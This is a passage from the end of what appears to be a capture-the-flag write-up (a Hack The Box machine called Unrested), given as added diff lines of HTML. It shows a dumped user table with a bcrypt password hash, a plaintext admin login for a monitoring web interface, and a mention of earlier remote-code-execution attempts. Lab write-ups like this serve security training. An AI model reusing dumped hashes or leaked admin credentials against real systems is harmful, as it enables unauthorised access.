+       0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | de
+fault  |      4 |            NULL |              0 |
+|      3 | matthew  | Matthew | Smith         | $2y$10$e2IsM6YkVvyLX43W5CVhxeA46ChWOUNRzSdIyVzKhRTK00eGq4SwS |     |  
+       1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | de
+fault  |      1 |            NULL |              0 |
++--------+----------+---------+---------------+--------------------------------------------------------------+-----+--
+---------+------------+---------+---------+---------+----------------+------------+---------------+---------------+---
+-------+--------+-----------------+----------------+
+3 rows in set (0.001 sec)
+</span></code></pre></div></div>
+<h4 id="gui-view">GUI View</h4>
+<p>Logging in as Admin / 96qzn0h2e1k3 shows me a ton more menus:</p>
+<picture>
+<source srcset="/img/image-20250228215539580.webp" type="image/webp"/>
+<img alt="image-20250228215539580" class="include_image" loading="lazy" src="/img/image-20250228215539580.png"/>
+</picture>
+<p>Under “Data collection” –&gt; “Hosts” –&gt; “Items” I’ll see my RCE attempts:</p>
+<picture>
+<source srcset="/img/image-20250228215907346.webp" type="image/webp"/>
+<img alt="image-20250228215907346" class="include_image" loading="lazy" src="/img/image-20250228215907346.png"/>
+</picture>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/03/04/htb-unrested.html"></a>
+</article>
